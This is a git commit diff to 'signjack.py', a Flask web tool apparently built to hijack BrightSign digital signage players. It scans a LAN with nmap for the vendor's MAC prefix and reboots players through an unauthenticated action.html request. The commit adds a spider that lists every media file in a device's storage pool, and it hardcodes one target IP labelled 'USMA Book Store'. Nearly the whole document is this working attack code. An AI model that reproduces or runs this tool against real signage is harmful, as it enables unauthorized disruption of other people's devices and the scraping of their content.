534986d8f37f59cbe15aae622d36dd4d306b549b
reap3r <SoulSaber1@gmail.com>
2017-05-01 21:38:55 -0400

    add scraping of all possible files

--- signjack.py
+++ signjack.py
@@ -5,12 +5,11 @@ import time, sys, re, socket, nmap, urllib2
 from flask import Flask, render_template, redirect, url_for, request
 from bs4 import BeautifulSoup
 
-
 #add some sort of sudo check
 
 #The flask object our app runs on top of
 app = Flask(__name__)
-nm = ""
+nm = nmap.PortScanner()
 
 #Define the vendor id for BrightSign MAC
 bsmac = "90:ac:3f"  #using Belkin, as i do not have access to sign
@@ -18,7 +17,8 @@ bsmac = "90:ac:3f"  #using Belkin, as i do not have access to sign
 #Global devices array; holds added device info
 #Device entries stored in tuple: (IP, Location)
 #Location is scraped from index of device
-devices = []
+devices = [("192.168.113.109", "USMA Book Store")]
+#devices = []
 
 #Determine our host ip; if not provided, use socket methods
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -32,6 +32,7 @@ def index():
   global devices
   return render_template("index.html", devices=devices)
 
+
 #Add a device by hand; no scanning required
 @app.route("/add", methods=['POST'])
 def manual_add():
@@ -41,12 +42,14 @@ def manual_add():
     devices.append((request.form["ip"], loc))
   return redirect(url_for("index"))
 
+
 #Leverages nmap to scan the LAN for BrightSign MACs
 @app.route("/scan", methods=['POST'])
 def dev_scan_button():
   global devices
   devices += scan_devices()
   return redirect(url_for("index"))
+
 
 #Remove all devices from the global device list
 @app.route("/clear", methods=['POST'])
@@ -55,21 +58,22 @@ def dev_clear_button():
   devices = []
   return redirect(url_for("index"))
 
+
 #Control backend for BrightSign utilities; reboot, etc.
 @app.route("/control", methods=["POST"])
 def control_panel():
-  try:
-    target = request.form["target"]
-    command = request.form["command"]
-    print target, command
+  target = request.form["target"]
+  command = request.form["command"]
 
-    if command is "Reboot":
-      url = "http://{}/action.html?reboot=Reboot".format(target)
-      urllib2.urlopen(url)
-  except:
-    pass
-
+  if command is "Reboot":
+    url = "http://{}/action.html?reboot=Reboot".format(target)
+    urllib2.urlopen(url)
+  else:
+    url = "http://{}/storage.html?rp=sd/pool".format(target)
+    spider(target, url)
+     
   return redirect(url_for("index"))
+
   
 #Nmap LAN for BrightSign MACs
 def scan_devices():
@@ -84,7 +88,6 @@ def scan_devices():
   return devices
 
 #Scrape BrightSign webpage to determine device location
-#location is always in the same spot; scraping can be done easily
 def get_dev_loc(ip):
   try:
     page = urllib2.urlopen("http://"+ip, timeout=2)
@@ -93,11 +96,41 @@ def get_dev_loc(ip):
     return loc
   except:
     pass
-  
-def main():
-  global nm
-  nm = nmap.PortScanner()
-  app.run()
+
+def scrape_links(url):
+    page = urllib2.urlopen(url)
+    page = BeautifulSoup(page, "html.parser")
+    links = page.find_all("a", href=True) 
+    content = [l["href"] for l in links if "pool" in l["href"] and "kill" not in l["href"]]
+    return content
+
+def scrap_files(url):
+    page = urllib2.urlopen(url)
+    page = BeautifulSoup(page, "html.parser")
+    links = page.find_all("a", href=True) 
+    content = [l["href"] for l in links if "sha" in l["href"] and "kill" not in l["href"]]
+    files = [f for f in content if "save" in f]
+    return files
+
+#Spider function to find all possible pictures on the BrightSign
+def spider(target, url):
+  folders = []
+  files = []
+  links = scrape_links(url)
+  for l in links:
+    for k in scrape_links("{}/{}".format(url, l[-1])):
+       folders.append("http://{}{}".format(target, k))
+  for f in folders:
+    files += scrap_files(f)
+  for i in range(len(files)):
+    files[i] = "http://{}{}".format(target, files[i])
+  return files
+    
 
 if __name__ == "__main__":
-  main()
+  app.run(debug=True)
+
+
+
+
+
